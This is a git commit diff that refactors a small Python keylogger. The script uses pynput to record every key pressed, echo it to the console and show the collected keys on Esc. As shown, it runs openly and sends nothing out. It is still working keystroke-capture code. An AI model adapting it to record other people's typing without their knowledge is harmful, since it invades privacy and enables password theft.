dea4c625eef0437c681f4b1d8dc6fb0bbc3698aa
nasus <77024697+nasusL@users.noreply.github.com>
2021-12-08 14:47:17 +0100

    shorter code

--- keyloggd.py
+++ keyloggd.py
@@ -10,28 +10,22 @@ def on_press(key):
     if key == keyboard.Key.shift:
         return
     elif key == keyboard.Key.esc:
-        raise quit_exception(key)
+        raise quit_exception()
     else:
         keys_pressed.append(str(key).replace("'", "").replace("Key.", ""))
         print(str(key).replace("'", "").replace("Key.", ""))
 
 
-def logger():
-    global keys_pressed
-    with keyboard.Listener(on_press=on_press) as listener:
-        try:
-            listener.join()
-        except:
-            os.system('cls' if os.name == 'nt' else 'clear')            
-            print("\n", *keys_pressed, sep=" ")
-            input("\n Press Enter to resume.\n ")
-            os.system('cls' if os.name == 'nt' else 'clear')            
-
-
-if __name__ == "__main__":
+if __name__ == "__main__": 
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("\nMinimal Python keylogger - Press Enter to start. - Press Esc to show results")
-    input()
+    input("Minimalistic Python keylogger - Press Enter to start. - Press Esc to show results\n")
     os.system('cls' if os.name == 'nt' else 'clear')
     while True:
-        logger()
+        with keyboard.Listener(on_press=on_press) as listener:
+            try:
+                listener.join()
+            except:
+                os.system('cls' if os.name == 'nt' else 'clear')            
+                print("\n", *keys_pressed, sep=" ")
+                input("\n Press Enter to resume.\n ")
+                os.system('cls' if os.name == 'nt' else 'clear')
